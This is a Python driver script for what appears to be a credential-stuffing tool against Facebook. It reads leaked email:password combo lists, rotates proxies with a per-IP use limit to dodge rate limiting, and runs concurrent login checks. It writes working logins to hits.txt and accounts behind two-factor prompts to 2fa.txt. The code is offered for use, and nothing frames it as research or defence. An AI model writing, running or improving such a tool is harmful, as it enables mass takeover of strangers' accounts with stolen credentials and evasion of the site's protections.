# main.py
import asyncio
import sys
import os
import json
from config import PROXY_FILE, CONCURRENCY, OUTPUT_DIR, PROXY_USES_PER_IP, DEBUG
from core.checker import Checker, Credential
from modules.facebook import Facebook


def load_combos(path: str) -> list[Credential]:
    creds = []
    with open(path, "r", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            for sep in (":", "|", ";"):
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and ("@" in parts[0] or parts[0].isdigit()):
                        creds.append(Credential(parts[0].strip(), parts[1].strip()))
                        break
    return creds


def load_proxies(path: str) -> list[str]:
    if not os.path.exists(path):
        return []
    proxies = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "://" not in line:
                parts = line.split(":")
                if len(parts) == 4:
                    host, port, user, pw = parts
                    line = f"http://{user}:{pw}@{host}:{port}"
                elif len(parts) == 2:
                    line = f"http://{line}"
            proxies.append(line)
    return proxies


async def main():
    if len(sys.argv) < 2:
        print("usage: python main.py combos.txt")
        sys.exit(1)

    combo_file = sys.argv[1]
    if not os.path.exists(combo_file):
        print(f"Fayl topilmadi: {combo_file}")
        sys.exit(1)

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    creds = load_combos(combo_file)
    proxies = load_proxies(PROXY_FILE)
    print(f"[+] {len(creds)} credential, {len(proxies)} proxy")
    print(f"[+] Concurrency: {CONCURRENCY}, Proxy uses per IP: {PROXY_USES_PER_IP}")

    modules = [Facebook()]
    checker = Checker(modules, proxies, concurrency=CONCURRENCY, proxy_uses=PROXY_USES_PER_IP)

    hits_file = open(f"{OUTPUT_DIR}/hits.txt", "a")
    twofa_file = open(f"{OUTPUT_DIR}/2fa.txt", "a")
    all_file = open(f"{OUTPUT_DIR}/all.txt", "a")
    full_file = open(f"{OUTPUT_DIR}/full.jsonl", "a")
    debug_file = open(f"{OUTPUT_DIR}/debug.log", "a") if DEBUG else None

    counts = {"HIT": 0, "2FA": 0, "BAD": 0, "BLOCKED": 0, "RATE": 0, "ERROR": 0}

    try:
        async for result in checker.run(creds):
            line = str(result)
            print(line, flush=True)
            all_file.write(line + "\n")
            all_file.flush()

            counts[result.status] = counts.get(result.status, 0) + 1

            if result.status == "HIT":
                hits_file.write(f"{result.cred.email}:{result.cred.password}\n")
                hits_file.flush()

            if result.status == "2FA":
                twofa_file.write(f"{result.cred.email}:{result.cred.password}\n")
                twofa_file.flush()

            full_file.write(json.dumps({
                "email": result.cred.email,
                "password": result.cred.password,
                "status": result.status,
                "proxy": result.proxy,
                "modules": result.modules,
                "raw": result.raw if DEBUG else None,
            }, default=str) + "\n")
            full_file.flush()

            if DEBUG and result.status == "ERROR" and debug_file:
                debug_file.write(f"{result.cred.email} | {result.raw}\n")
                debug_file.flush()
    finally:
        hits_file.close()
        twofa_file.close()
        all_file.close()
        full_file.close()
        if debug_file:
            debug_file.close()

        print()
        print("[+] Natijalar:")
        for k, v in counts.items():
            print(f"    {k}: {v}")


if __name__ == "__main__":
    asyncio.run(main())